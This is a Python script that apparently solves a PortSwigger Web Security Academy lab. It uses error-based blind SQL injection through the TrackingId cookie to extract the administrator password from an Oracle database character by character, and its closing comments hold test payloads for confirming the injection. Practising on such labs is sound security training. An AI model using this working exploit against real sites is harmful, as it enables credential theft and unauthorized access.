import requests
import string

URL = "https://0af1006004ebe9218085a8a7006400ed.web-security-academy.net"
PATH = "/filter"
QUERY = {
    "category": "Gifts"
}

def makeRequest(url=URL, path=PATH, query=QUERY, cookie=None):    
    response = requests.request(
    "GET",
    f"{URL}{PATH}",
    params=QUERY,
    cookies=cookie
    )
    return response

def bruteforceChar(debug=None, showHeaders=None):
    res = makeRequest()
    cookies = res.cookies
    CHARS =  list(string.ascii_lowercase)
    CHARS.extend([x for x in string.digits])
    PASSWORD = ""
    INDEX = 1
    FOUND = True
    
    while True:
        for char in CHARS:
            PAYLOAD = f"{cookies.get('TrackingId')}' || (SELECT CASE WHEN (SUBSTR(password, {INDEX}, 1) = '{char}') THEN TO_CHAR(1/0) ELSE 'x' END FROM users WHERE username='administrator') ||' "
            modified_cookies = {"TrackingId":PAYLOAD,"session": cookies.get('session')}
            session = makeRequest(cookie=modified_cookies)
            
            # Check if we found a character in the password
            if session.status_code == 500:
                PASSWORD += char
                print(f"Password charcter at index {INDEX}: {char} ")
                INDEX = (INDEX + 1)
                FOUND = True
                break
            else:
                FOUND = False
        # If we didn't find anything on the last loop
        # password string is complete
        if FOUND is False:
            break
    return PASSWORD

creds = bruteforceChar()
print(creds)


## TEST CASE ##

## Use the following payload to determine if the HTTP 500 is actually being caused by SQL
# abc'||(SELECT '')||'
## Out of all the main SQL DB's, Oracle is the only one where you need to specify a table name
## '||(SELECT '' FROM dual)||'

## Use the payload below to determine a true or false condition based on whether the DB errors
## For some reason we have to use concatenation here instead of an AND
## Presumably this is because the query takes one string statement, so we concat to make it one string
# PAYLOAD = f"test' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ||'"

## REF: https://portswigger.net/web-security/sql-injection/cheat-sheet
